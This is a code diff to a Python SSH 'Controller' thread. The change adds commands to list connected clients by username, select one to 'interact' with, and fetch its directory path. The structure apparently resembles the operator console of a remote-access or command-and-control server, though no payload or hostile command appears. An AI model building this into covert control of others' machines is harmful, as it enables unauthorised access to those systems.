@@ -84,17 +84,33 @@ class Controller(threading.Thread):
     def handler(self, contr_ssh_channel):
         while not contr_ssh_channel.closed:
             command = contr_ssh_channel.recv(1024).decode('utf-8').split(" ")
-            if command[0] == "getdir" and len(command[1]):
-                try: contr_ssh_channel.send(self.clients.get_client_path(int(command[1])))
-                except IndexError:
-                    contr_ssh_channel.send("[SERVER] Invalid Client\n")
-            elif command[0] == "quit":
+            if command[0] == "list":
+                s = ""
+                for i, client in enumerate(self.clients.connected):
+                    s += f"{i}\t{client.username}\n"
+                if s == "": s = "No connected Clients"
+                contr_ssh_channel.send(s.strip())
+            elif command[0] == "interact" and len(command[1]):
+                if len(self.clients.connected) <= int(command[1]):
+                    contr_ssh_channel.send("clientnotfound")
+                    continue
+                else: self.handle_client(contr_ssh_channel, int(command[1]))
+            elif command[0] == "exit":
                 self.exit_controller_session()
                 return
             elif command[0] == "ping":
-                contr_ssh_channel.send("[SERVER] pong")
+                contr_ssh_channel.send("pong")
             else:
-                contr_ssh_channel.send("[SERVER] Invalid command")
+                contr_ssh_channel.send("Invalid command")
+
+    def handle_client(self, contr_ssh_channel, client_no):
+        while not contr_ssh_channel.closed:
+            command = contr_ssh_channel.recv(1024).decode('utf-8').split(" ")
+            if command[0] == "getdir":
+                try: contr_ssh_channel.send(self.clients.get_client_path(client_no))
+                except IndexError:
+                    contr_ssh_channel.send("clientnotfound")
+                    return
 
     def exit_controller_session(self):
         try:
